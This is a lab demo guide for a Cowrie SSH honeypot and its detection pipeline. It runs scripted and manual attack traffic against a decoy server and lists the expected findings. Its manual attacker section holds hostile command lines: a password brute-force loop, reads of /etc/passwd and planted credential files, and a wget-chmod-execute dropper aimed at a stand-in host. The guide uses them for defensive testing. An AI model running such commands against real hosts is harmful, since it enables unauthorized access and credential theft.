# Controlled demo guide: Cowrie SSH component

This guide covers authorized traffic only, against the lab decoy. It has two modes:

- **A.** Local rehearsal on one machine, which was verified on the Windows dev machine.
- **B.** The three-laptop team network, using the steps in [deployment.md](deployment.md).

## A. Local rehearsal (one machine)

```bash
# 1. Start the decoy, the collector, and the local dev receiver (stand-in for the SOC backend)
export SOC_INGEST_TOKEN=$(python -c "import secrets; print(secrets.token_urlsafe(24))")   # required by the dev receiver
SOC_INGEST_URL=http://dev-receiver:8088/ingest docker compose --profile dev up -d --build

# 2. Watch the dev receiver print each record as it arrives (second terminal)
docker compose logs -f dev-receiver

# 3. Generate bounded, real SSH traffic from a separate container
docker compose --profile demo build demo-attacker
docker compose --profile demo run --rm demo-attacker benign      # baseline / noise comparison
docker compose --profile demo run --rm demo-attacker full        # brute force, recon, honeytoken, dropper
#   individual scenarios: bruteforce | recon | honeytoken | download

# 4. Inspect collector state (checkpoint, pending, quarantine, dead letters)
docker compose exec collector cowrie-soc status --config /app/config/collector.toml

# 5. Look at the evidence chain for one finding
curl -s -H "Authorization: Bearer $SOC_INGEST_TOKEN" "http://127.0.0.1:8088/records?type=finding&limit=3"
```

On Git Bash for Windows, prefix `docker compose exec ... /absolute/path` commands with `MSYS_NO_PATHCONV=1`.

Expected receiver output after `full`:

| Severity | Rule | Title |
|---|---|---|
| MEDIUM | SSH-BRUTE-001 | SSH brute force from 172.18.0.x: 5 failed logins in ~6s |
| HIGH | SSH-AUTH-002 | Decoy SSH login as 'backup' from 172.18.0.x after 8 failed attempts |
| MEDIUM, then HIGH | SSH-DISC-001 | Discovery burst: 3, then 5, ATT&CK discovery techniques |
| CRITICAL | SSH-CRED-001 | Honeytoken credential file read: /var/backups/db/.my.cnf (and app/.env) |
| HIGH | SSH-TOOL-001 | Download attempt from http://192.0.2.10/bins/update.sh |
| CRITICAL | SSH-SEQ-001 | Dropper sequence: download -> chmod +x -> execute 'update.sh' |

There are also LOW SSH-EXEC-001 findings, one per interactive session.

## B. Team demo talking points (about 2 minutes for the SSH part)

1. **The decoy.** `ssh backup@<honeypot-ip>` from the attacker laptop shows a believable Debian backup server (`bkp-db-01`) with `/var/backups/db` and `/var/backups/app`. Everything is synthetic, and commands are emulated.
2. **Real interaction produces a genuine log.** Run:

   ```bash
   docker compose exec cowrie /cowrie/cowrie-env/bin/python3 -c "print(open('/cowrie/cowrie-git/var/log/cowrie/cowrie.json').readlines()[-1])"
   ```

   It shows the exact line Cowrie wrote.
3. **Normalization with evidence.** The same event in `normalized.jsonl` keeps the raw object, its SHA-256, and the file and offset in `raw`.
4. **Detection.**
   - Show one finding: rule, threshold and window, observed values, `event_ids`, ATT&CK mapping, and explanation.
   - The honeytoken read is CRITICAL because no legitimate user would open those files.
5. **Safety.**
   - `wget` from the decoy fails, because outbound sockets are bound to loopback.
   - `ssh -W` forwarding is refused.
   - No host mounts are used, and containers run read-only and non-root.
6. **Integration boundary.**
   - Records go to the HTTP sink with stable IDs and at-least-once delivery.
   - Say clearly whether the shared backend integration was completed and verified. If it was not, show the dev receiver and the contract doc.

Manual attacker commands for the team demo (OpenSSH on the attacker laptop):

```bash
for p in root 123456 admin toor password; do ssh -o PreferredAuthentications=password -o PubkeyAuthentication=no root@<ip> -p 22 exit; done   # type each password when prompted
ssh -p 22 backup@<ip>          # Backup@2024
  whoami; id; uname -a; cat /etc/passwd; netstat -an; ps aux
  cd /var/backups && ls -la db app && cat db/.my.cnf
  wget http://192.0.2.10/bins/update.sh -O /tmp/update.sh; chmod +x /tmp/update.sh; /tmp/update.sh
  exit
```

## Fallback if the live network fails

Replay the real capture through the same code path. This output is labelled "replay of a recorded capture", not a live result:

```bash
cd collector
python -m cowrie_soc replay tests/fixtures/real_capture_2026-10-31.json --config config/collector.toml --summary
```

## Reset

Do not use `down -v`, `docker volume rm` or `docker volume prune`. In the merged project they can delete shared database and SOC data. Leave volumes in place between demos.
